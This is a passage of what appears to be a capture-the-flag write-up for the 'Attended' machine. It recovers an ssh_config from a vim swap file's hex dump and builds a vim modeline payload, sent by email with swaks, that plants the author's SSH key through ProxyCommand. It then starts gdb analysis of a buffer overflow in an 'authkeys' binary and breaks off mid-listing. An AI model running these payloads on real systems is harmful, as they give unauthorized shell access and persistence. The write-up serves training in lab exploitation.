000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000747001007f0000000200000000000000070000000000000001000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000616400003f0f0000770f0000001000000700000000000000f90f0000e80f0000d30f0000b70f0000a30f0000900f0000770f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002020536572766572416c697665496e74657276616c2036300020205443504b656570416c69766520796573002020436f6e74726f6c50657273697374203468002020436f6e74726f6c50617468202f746d702f25724025683a2570002020436f6e74726f6c4d6173746572206175746f002020557365722066726573686e65737300486f7374202a00</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+</div>
+<div class="sect2">
+<h3 id="4-2-restoring-config-swp">4.2 RESTORING .config.swp</h3>
+<div class="paragraph">
+<p>Saving the hex output into a file, <strong><code>.config.swp.hex</code></strong>, then decoding it into the original file:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ cat .config.swp.hex | xxd -p -r > .config.swp</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>To fully recover the file, just open a file called <strong><code>config</code></strong> in vim and then press <strong><code>r</code></strong>:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ vim config
+
+  Swap file ".config.swp" already exists!
+  [O]pen Read-Only, (E)dit anyway, (R)ecover, (D)elete it, (Q)uit, (A)bort: r
+
+$ cat config
+
+  Host *
+    User freshness
+    ControlMaster auto
+    ControlPath /tmp/%r@%h:%p
+    ControlPersist 4h
+    TCPKeepAlive yes
+    ServerAliveInterval 60</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>It seems to be an <strong><code>ssh_config</code></strong> file for the user, <strong><code>freshness</code></strong>. Maybe this could be abused by using <strong><code>ProxyCommand</code></strong> like so:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">Host *
+  User freshness
+  ControlMaster auto
+  ControlPath /tmp/%r@%h:%p
+  ControlPersist 4h
+  TCPKeepAlive yes
+  ServerAliveInterval 60
+  ProxyCommand echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAjMN54BBvvnJUXFjy9FSQ0zUVC7ZJg8FG+hPkNcoIk/ZZTz84yzE3sobaFTgDhfsjgisDd2jjZg8xuBZ4Gjo2pE0aqUQfP4bQwL6N4k+TmqMjBamwy7Copjt+sF0m4EJX1ZkURCFgL1ssqXorFDfRZSA3WingLrq2GYcJS9TMLlt5ZFzcT+umOHGE5wtYCHu11yCSpZNFl2S04GTsB2R/D3X1tQqRdWpIg1JGD0/gSFSuBJNn7ngOfPKQrjlBOrvCgtB+mWgBLp0smETICi9IqIvnW6K5AWNP+ZxWm4Bjl5Vor0mmfQdCcRVElZdpEEW59XSwnhlCpzW+hk8MzQGUoqJ01JKa03rFqdHLHWIy2sfS4vFsG450A4un/hClPMoQxf12gwY2WwsBwAwRKTi1Q23lnLN/NolaCdzOdEUzVc9drcQbvWlR+dxkiW09eFEqk6TEFiVtla2oywhozphFdjye7GPVfuz/862VAMOyG/Ny/82dGOzmt+irNsfc5Tc= >> /home/freshness/.ssh/authorized_keys</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Based on the directory listing of <strong><code>/home</code></strong>, <strong><code>/home/shared</code></strong> is world writable:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ ./cmd.sh "ls -la /home"</code></pre>
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">total 20
+drwxr-xr-x   5 root       wheel      512 Jun 26  2019 .
+drwxr-xr-x  13 root       wheel      512 May  8 11:05 ..
+drwxr-x---   4 freshness  freshness  512 Nov 12 16:56 freshness
+drwxr-x---   4 guly       guly       512 May  8 15:12 guly
+drwxrwx-wx   2 root       freshness  512 Dec 11 22:25 shared</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Now, attempting to write a config file with ProxyCommand into <strong><code>/home/shared/config</code></strong> using the vim modelines exploit:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ cat ssh.txt
+
+  :!echo -en 'Host *\n  User freshness\n  ControlMaster auto\n  ControlPath /tmp/%r@%h:%p\n  ControlPersist 4h\n  TCPKeepAlive yes\n  ServerAliveInterval 60\n  ProxyCommand echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAjMN54BBvvnJUXFjy9FSQ0zUVC7ZJg8FG+hPkNcoIk/ZZTz84yzE3sobaFTgDhfsjgisDd2jjZg8xuBZ4Gjo2pE0aqUQfP4bQwL6N4k+TmqMjBamwy7Copjt+sF0m4EJX1ZkURCFgL1ssqXorFDfRZSA3WingLrq2GYcJS9TMLlt5ZFzcT+umOHGE5wtYCHu11yCSpZNFl2S04GTsB2R/D3X1tQqRdWpIg1JGD0/gSFSuBJNn7ngOfPKQrjlBOrvCgtB+mWgBLp0smETICi9IqIvnW6K5AWNP+ZxWm4Bjl5Vor0mmfQdCcRVElZdpEEW59XSwnhlCpzW+hk8MzQGUoqJ01JKa03rFqdHLHWIy2sfS4vFsG450A4un/hClPMoQxf12gwY2WwsBwAwRKTi1Q23lnLN/NolaCdzOdEUzVc9drcQbvWlR+dxkiW09eFEqk6TEFiVtla2oywhozphFdjye7GPVfuz/862VAMOyG/Ny/82dGOzmt+irNsfc5Tc= >>/home/freshness/.ssh/authorized_keys\n' > /home/shared/config && ping -c1 10.10.14.28 ||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
+
+$ swaks --to "guly@attended.htb" --from "freshness@10.10.14.8" --body "something" --attach ssh.txt --server 10.10.10.221</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>After waiting for guly to reply to the sent email, we can SSH into the box as freshness:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ ssh -i freshness.id_rsa -l freshness 10.10.10.221
+
+attended$ id
+
+  uid=1001(freshness) gid=1001(freshness) groups=1001(freshness)
+
+attended$ ls -l
+
+  total 16
+  drwxr-x---  2 freshness  freshness  512 Nov 16 13:57 authkeys
+  -rw-r--r--  1 freshness  freshness  436 May  8 16:27 dead.letter
+  -rwxr-x---  1 root       freshness  422 Jun 28  2019 fchecker.py
+  -r--r-----  1 root       freshness   33 Jun 26  2019 user.txt
+
+attended$ cat user.txt
+
+  b0390ad535424c0981699b93041a3ff1</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<hr>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="part-5-exploiting-authkeys">PART 5 : EXPLOITING authkeys</h2>
+<div class="sectionbody">
+<div class="sect2">
+<h3 id="5-1-enumerating-inside-freshness">5.1 ENUMERATING INSIDE freshness</h3>
+<div class="paragraph">
+<p>There is a note left in <strong><code>~/authkeys</code></strong> stating that an <strong><code>authkeys</code></strong> command was enabled in the attended gateway but not in the attended machine:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">attended$ cd ~/authkeys
+
+attended$ ls -la
+
+  total 24
+  drwxr-x---  2 freshness  freshness   512 Nov 16 13:57 .
+  drwxr-x---  4 freshness  freshness   512 Nov 12 16:56 ..
+  -rw-r--r--  1 root       wheel      5424 Nov 16 13:35 authkeys
+  -rw-r-----  1 root       freshness   178 Nov  6  2019 note.txt
+
+attended$ cat note.txt
+
+  on attended:
+  [ ] enable authkeys command for sshd
+  [x] remove source code
+  [ ] use nobody
+  on attendedgw:
+  [x] enable authkeys command for sshd
+  [x] remove source code
+  [ ] use nobody</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Based on <strong><code>/etc/ssh/sshd_config</code></strong>, the <strong><code>authkeys</code></strong> command takes four arguments and is owned by root:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">attended$ cat /etc/ssh/sshd_config
+
+  #AuthorizedKeysCommand /usr/local/sbin/authkeys %f %h %t %k
+  #AuthorizedKeysCommandUser root</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Based on the OpenBSD sshd_config documentation:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<table class="tableblock frame-all grid-all stretch">
+<colgroup>
+<col style="width: 30%;">
+<col style="width: 70%;">
+</colgroup>
+<tbody>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock">%f</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">The fingerprint of the key or certificate.</p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock">%h</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">The home directory of the user.</p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock">%t</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">The key or certificate type.</p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock">%k</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">The base64-encoded key or certificate for authentication.</p></td>
+</tr>
+</tbody>
+</table>
+</blockquote>
+</div>
+</div>
+<div class="sect2">
+<h3 id="5-2-my-own-openbsd-instance">5.2 MY OWN OPENBSD INSTANCE</h3>
+<div class="paragraph">
+<p>I created my own local OpenBSD instance to aid in exploiting the authkeys binary and inside, I edited the <strong><code>sshd_config</code></strong> file:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ ssh -l jebidiah 192.168.222.134
+
+obsd$ cat /etc/ssh/sshd_config
+
+  AuthorizedKeysCommand /usr/local/sbin/authkeys %f %h %t %k
+  AuthorizedKeysCommandUser root</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+</div>
+<div class="sect2">
+<h3 id="5-3-finding-the-buffer-overflow">5.3 FINDING THE BUFFER OVERFLOW</h3>
+<div class="paragraph">
+<p>Looking at the disassembly of something is written to <strong><code>0x6010c0</code></strong>:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"> 0x400345 [os]
+; CODE XREF from entry0 @ 0x40033e
+0x00400345 4889c1         mov rcx, rax
+0x00400348 48bfc0106000.  movabs rdi, 0x6010c0
+0x00400352 4889e6         mov rsi, rsp
+0x00400355 f3a4           rep movsb byte [rdi], byte ptr [rsi]
+0x00400357 4c89e6         mov rsi, r12
+0x0040035a 4881c4000300.  add rsp, 0x300
+0x00400361 4831c0         xor rax, rax
+0x00400364 4831f6         xor rsi, rsi
+0x00400367 4889f7         mov rdi, rsi
+0x0040036a 5a             pop rdx
+0x0040036b c3             ret</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>And based on <strong><code>gdb</code></strong> that address is part of the <strong><code>.data</code></strong> segment of the memory which is the corresponding virtual address space of a program that contains initialized static variables:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">obsd$ gdb authkeys
+
+(gdb) info files
+Symbols from "/home/jebidiah/authkeys".
+Local exec file:
+	`/home/jebidiah/authkeys', file type elf64-x86-64.
+	Entry point: 0x400240
+	0x0000000000400240 - 0x00000000004003d2 is .text
+	0x00000000005003d2 - 0x00000000005003ea is .note.openbsd.ident
+	0x0000000000601000 - 0x00000000006013c0 is .data</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Since I know that the key should be base64 encoded, I created an encoded string of "A"s:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ python -c 'print "A" * 100' | base64 | tr -d '\n'</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Then running it in gdb and setting a breakpoint to <strong><code>0x00400361</code></strong>:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">(gdb) break * 0x00400361
+
+(gdb) run 1 2 ssh-rsa QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQo=
+
+(gdb) x/12xg 0x6010c0
+
+  0x6010c0:	0x4141414141414141	0x4141414141414141
+  0x6010d0:	0x4141414141414141	0x4141414141414141
+  0x6010e0:	0x4141414141414141	0x4141414141414141
+  0x6010f0:	0x4141414141414141	0x4141414141414141
+  0x601100:	0x4141414141414141	0x4141414141414141
+  0x601110:	0x4141414141414141	0x4141414141414141</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The keys argument is decoded and written to <strong><code>0x6010c0</code></strong>. Now, to create a long enough buffer to induce a segmentation fault:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">$ msf-pattern_create -l 1000 | base64 | tr -d '\n'</code></pre>
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">(gdb) break * 0x00400361
+
